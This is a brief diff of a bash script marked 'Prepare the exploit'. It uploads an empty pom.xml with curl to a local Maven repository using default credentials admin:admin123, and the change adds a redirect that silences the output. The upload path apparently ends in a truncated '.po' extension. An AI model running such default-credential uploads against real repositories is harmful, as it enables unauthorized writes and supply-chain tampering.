@@ -9,5 +9,5 @@ fi
 
 # Prepare the exploit
 #!/bin/bash
-touch /tmp/pom.xml
-curl -v -u admin:admin123 --upload-file /tmp/pom.xml http://localhost:8081/repository/maven-releases/org/foo/1.0/foo-1.0.po
+touch /tmp/pom.xml 
+curl -v -u admin:admin123 --upload-file /tmp/pom.xml http://localhost:8081/repository/maven-releases/org/foo/1.0/foo-1.0.po > /dev/null 2>&1
